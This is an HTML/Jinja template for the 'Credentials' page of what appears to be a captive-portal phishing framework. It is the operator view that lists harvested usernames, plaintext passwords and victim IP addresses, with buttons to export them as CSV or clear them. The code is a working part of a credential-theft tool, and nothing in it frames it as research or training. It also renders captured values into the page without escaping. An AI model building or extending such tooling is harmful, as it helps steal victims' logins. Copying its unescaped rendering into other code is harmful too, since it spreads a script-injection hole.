{% extends "base.html" %}
{% block title %}Credentials - Captive Framework{% endblock %}
{% block content %}
<div class="page-header" style="display: flex; justify-content: space-between; align-items: flex-end;">
    <div>
        <h2>Credentials</h2>
        <p class="subtitle">View and export captured credentials</p>
    </div>
    <div>
        <button class="btn" style="background: var(--bg-hover); color: var(--text-main); margin-right: 8px;" onclick="loadCredentials()">Refresh</button>
        <a href="/api/credentials/export" class="btn btn-primary" target="_blank">Export CSV</a>
        <button class="btn btn-danger" onclick="clearCredentials()">Clear All</button>
    </div>
</div>

<div class="config-panel" style="padding: 0;">
    <table style="width: 100%; border-collapse: collapse; text-align: left;">
        <thead>
            <tr style="border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.2);">
                <th style="padding: 16px; font-weight: 500; color: var(--text-muted); font-size: 0.85rem;">MODULE</th>
                <th style="padding: 16px; font-weight: 500; color: var(--text-muted); font-size: 0.85rem;">SITE</th>
                <th style="padding: 16px; font-weight: 500; color: var(--text-muted); font-size: 0.85rem;">USERNAME/EMAIL</th>
                <th style="padding: 16px; font-weight: 500; color: var(--text-muted); font-size: 0.85rem;">PASSWORD</th>
                <th style="padding: 16px; font-weight: 500; color: var(--text-muted); font-size: 0.85rem;">VICTIM IP</th>
                <th style="padding: 16px; font-weight: 500; color: var(--text-muted); font-size: 0.85rem;">TIME</th>
            </tr>
        </thead>
        <tbody id="creds-table">
            <tr><td colspan="6" style="padding: 32px; text-align: center; color: var(--text-muted);">Loading credentials...</td></tr>
        </tbody>
    </table>
</div>

<script>
document.addEventListener("DOMContentLoaded", loadCredentials);

function loadCredentials() {
    fetch("/api/credentials").then(r => r.json()).then(data => {
        var html = "";
        if (data.length === 0) {
            html = '<tr><td colspan="6" style="padding: 32px; text-align: center; color: var(--text-muted);">No credentials captured yet.</td></tr>';
        } else {
            data.forEach(function(c) {
                html += '<tr style="border-bottom: 1px solid var(--border);">';
                html += '<td style="padding: 16px;"><span class="badge badge-small">' + c.module + '</span></td>';
                html += '<td style="padding: 16px; font-weight: 500;">' + c.site + '</td>';
                html += '<td style="padding: 16px;">' + c.username + '</td>';
                html += '<td style="padding: 16px; font-family: monospace;">' + c.password + '</td>';
                html += '<td style="padding: 16px; color: var(--text-muted);">' + c.ip + '</td>';
                html += '<td style="padding: 16px; color: var(--text-muted); font-size: 0.85rem;">' + c.timestamp + '</td>';
                html += '</tr>';
            });
        }
        document.getElementById("creds-table").innerHTML = html;
    }).catch(function() {
        document.getElementById("creds-table").innerHTML = '<tr><td colspan="6" style="padding: 32px; text-align: center; color: var(--danger);">Failed to load credentials.</td></tr>';
    });
}

function clearCredentials() {
    if (confirm("Are you sure you want to delete all captured credentials?")) {
        fetch("/api/credentials/clear", {method: "POST"}).then(function() {
            loadCredentials();
        });
    }
}
</script>
{% endblock %}
